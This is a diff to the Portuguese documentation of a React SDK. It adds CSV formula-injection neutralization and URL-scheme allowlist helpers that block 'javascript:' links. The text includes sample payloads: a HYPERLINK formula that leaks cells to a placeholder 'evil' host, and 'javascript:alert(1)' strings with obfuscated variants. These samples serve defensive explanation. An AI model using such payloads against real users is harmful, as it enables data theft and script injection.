@@ -449,13 +449,33 @@ await downloadCsv(usuarios, COLUNAS, "usuarios.csv"); // entrega ao usuário
 | `toCsv(rows, columns, options?)` | Devolve o arquivo inteiro como `string`. |
 | `downloadCsv(rows, columns, fileName?, options?)` | Monta o blob `text/csv;charset=utf-8` e passa pro `shareOrDownloadBlob`. |
 | `CsvColumn<T>` | `{ key, header, csv? }` |
-| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean }` — defaults `","` e `true`. |
+| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean, neutralizeFormulas?: boolean }` — defaults `","`, `true` e `true`. |
 
 !!! danger "A coluna do `DataTable` **não** serve direto quando tem `render`"
     `DataTableColumn.render` devolve `ReactNode`. Exportar isso escreve `[object Object]` justamente na coluna que tem badge, link ou data formatada — a mais importante da tabela. Uma coluna **sem** `render` é estruturalmente compatível e pode ser reaproveitada; com `render`, dê o acessor `csv`.
 
 !!! check "Escaping RFC 4180, e o BOM que o Excel pt-BR exige"
     Campo com o delimitador, com aspas ou com quebra de linha vira campo citado, e cada aspas interna é duplicada. O arquivo termina as linhas com `\r\n`. O BOM vem por padrão porque sem ele o Excel em pt-BR lê UTF-8 como Latin-1 e todo acento vira mojibake.
+
+!!! check "Fórmula vira texto por padrão (CSV injection)"
+    Campo de texto que começa com `=`, `+`, `-`, `@`, TAB ou CR é tratado como início de **fórmula** pela lista da OWASP — Excel e Google Sheets leem assim; o LibreOffice 26.2 avaliou só o `=` (tabela abaixo). Abrir o arquivo avalia a fórmula. Um nome de usuário `=HYPERLINK("https://evil/?d="&A1,"ver")` vira um link que vaza as outras células. Por isso `toCsv` e `downloadCsv` prefixam `'` nesses campos, como recomenda a OWASP: o LibreOffice 26.2 importou `=1+2` como a fórmula `of:=1+2` (valor `3`) antes, e como o texto `'=1+2` depois.
+
+    Número não é tocado: célula `number`, ou texto que é só número (`"-5"`, `"-1.234,56"`, `"+42"`), não pode ser fórmula — e prefixar transformaria todo valor negativo do relatório em texto. O `"-"` sozinho também fica como está: é o placeholder de "sem valor" e não tem operando para virar fórmula. O custo é o `'` visível no texto neutralizado. Se o arquivo vai pro importador de outro sistema, e não pra planilha de uma pessoa, desligue com `{ neutralizeFormulas: false }` e os bytes saem como vieram.
+
+Como cada entrada é lida, medido convertendo o CSV com o LibreOffice 26.2 headless (`soffice --headless --infilter="CSV:59,34,76,1" --convert-to fods`) e lendo o `table:formula` de cada célula:
+
+| Entrada | Sem prefixo (`neutralizeFormulas: false`) | Com prefixo (padrão) |
+| --- | --- | --- |
+| `=1+2` | fórmula, valor `3` | texto `'=1+2` |
+| `=HYPERLINK("http://…/?d="&A1,"x")` | fórmula | texto |
+| `+55 (11) 99999-9999` | texto | texto `'+55 (11) 99999-9999` |
+| `@maria` | texto | texto `'@maria` |
+| `-` | texto | texto `-` (isento) |
+| TAB + `=1+1` | texto | texto `'` + TAB + `=1+1` |
+| espaço + `=1+1` | texto | texto (não é gatilho) |
+| `\n=1+1` (campo entre aspas) | texto | texto (não é gatilho) |
+
+O LibreOffice só avaliou o `=`. `+`, `@` e TAB seguem no gatilho porque Excel e Google Sheets os leem como início de fórmula — essa é a lista da OWASP, e ela não foi medida aqui no Excel.
 
 !!! tip "Delimitador `;` é o certo em locale pt-BR"
     Onde o separador decimal é a vírgula, o Excel abre um CSV separado por vírgula **em uma coluna só**. `{ delimiter: ";" }` resolve — e o escaping acompanha, citando o campo que contém `;` em vez do que contém `,`.
@@ -467,6 +487,43 @@ await downloadCsv(usuarios, COLUNAS, "usuarios.csv"); // entrega ao usuário
     Quem abre precisa ver quais colunas pediu. Arquivo de zero byte parece erro de exportação.
 
 ---
+
+## URL que veio de outra pessoa — `safeLinkUrl`, `safeImageUrl`, `safeAttachmentUrl`
+
+Todo `href` montado com dado de usuário é um lugar onde `javascript:alert(1)` vira script no clique. O React 19 troca um `href` `javascript:` por um stub que lança erro, mas o SDK aceita React 18 — e o 18 só avisa no console. Medido com `react-dom` 18.3.1: o `href` sai literal, e clicar roda o script no Chromium 153 e no Firefox 155, **mesmo com `download`** no `<a>`.
+
+Os três helpers são a mesma allowlist de esquema que o `Markdown` e o `Chat` usam por dentro. Devolvem a URL, ou `null` quando ela não pode virar `href`/`src`:
+
+```tsx
+import { safeAttachmentUrl, safeImageUrl, safeLinkUrl } from "tempest-react-sdk";
+
+export function Anexo({ url, nome }: { url: string; nome: string }) {
+  const href = safeAttachmentUrl(url);
+  return href ? (
+    <a href={href} download={nome}>
+      {nome}
+    </a>
+  ) : (
+    <span>{nome}</span>
+  );
+}
+
+safeLinkUrl("https://x.dev"); // "https://x.dev"
+safeLinkUrl("JaVaScRiPt:alert(1)"); // null
+safeImageUrl("data:image/svg+xml;base64,PHN2Zz4="); // null
+```
+
+| Helper | Aceita | Use em |
+| --- | --- | --- |
+| `safeLinkUrl` | `http`, `https`, `mailto`, `tel`, `sms`, relativa | link que a pessoa clica |
+| `safeImageUrl` | o mesmo + `data:image/` raster (png/jpeg/gif/webp/avif/bmp) | `src` de imagem |
+| `safeAttachmentUrl` | `http`, `https`, `blob`, relativa + `data:image/` raster | arquivo pra baixar — `blob:` é o upload ainda em voo |
+
+!!! check "Allowlist, não blocklist"
+    Antes de comparar, os três tiram espaço e caractere de controle, então `java\tscript:` e `\u0001javascript:` caem como `javascript:`. Uma blocklist teria que enumerar cada grafia; a allowlist recusa o que não conhece.
+
+!!! info "`safeAttachmentUrl` devolve a URL como veio"
+    O esquema é julgado na forma normalizada, mas o retorno é o original: normalizar apaga espaço, e `/arquivos/relatório final.pdf` é um caminho real. A normalização só **remove** caracteres — mais do que o parser de URL do navegador remove —, então não há esquema que ele veja e o helper não.
 
 ## Storage comprimido — `compressedStorage`
 
@@ -571,7 +628,8 @@ Mesma política best-effort do par JSON: SSR-safe, nunca lança, silencia erro d
 
 - Importe qualquer helper direto de `tempest-react-sdk` — todos são exports nomeados, puros e tree-shakable.
 - **Planilhas**: `writeXlsx(headers, rows)` gera um `.xlsx` UTF-8 de uma aba como `Uint8Array` (sem drama de BOM do CSV).
-- **CSV**: `toCsv(rows, columns)` escreve o arquivo com escaping RFC 4180 e BOM; `downloadCsv(...)` entrega direto ao usuário.
+- **CSV**: `toCsv(rows, columns)` escreve o arquivo com escaping RFC 4180 e BOM, e neutraliza fórmula por padrão; `downloadCsv(...)` entrega direto ao usuário.
+- **URL de usuário**: `safeLinkUrl`, `safeImageUrl` e `safeAttachmentUrl` devolvem a URL ou `null` — allowlist de esquema antes de qualquer `href`/`src`.
 - **Datas e percentuais**: `formatDateForInput` dá o `yyyy-MM-dd` que o `<input type="date">` exige e `formatDateTimeForInput` dá o `yyyy-MM-ddTHH:mm` do `<input type="datetime-local">` (os dois pelas partes locais, sem o desvio de UTC); `percentOf` devolve `0` em vez de `NaN` quando a base é zero.
 - **Storage comprimido**: `compressedStorage.get/set` gzipa o que grava; formato autodescritivo (`~tgz1:`) lê valores antigos sem migração. Com React, `useLocalStorage(key, def, compressedStorageCodec)`.
 - **Arrays/Objetos**: `groupBy`, `uniqueBy`, `chunk`, `range`, `pick`, `omit`, `deepMerge`, `isEmpty` — sempre imutáveis; `deepMerge` substitui arrays em vez de fundir.
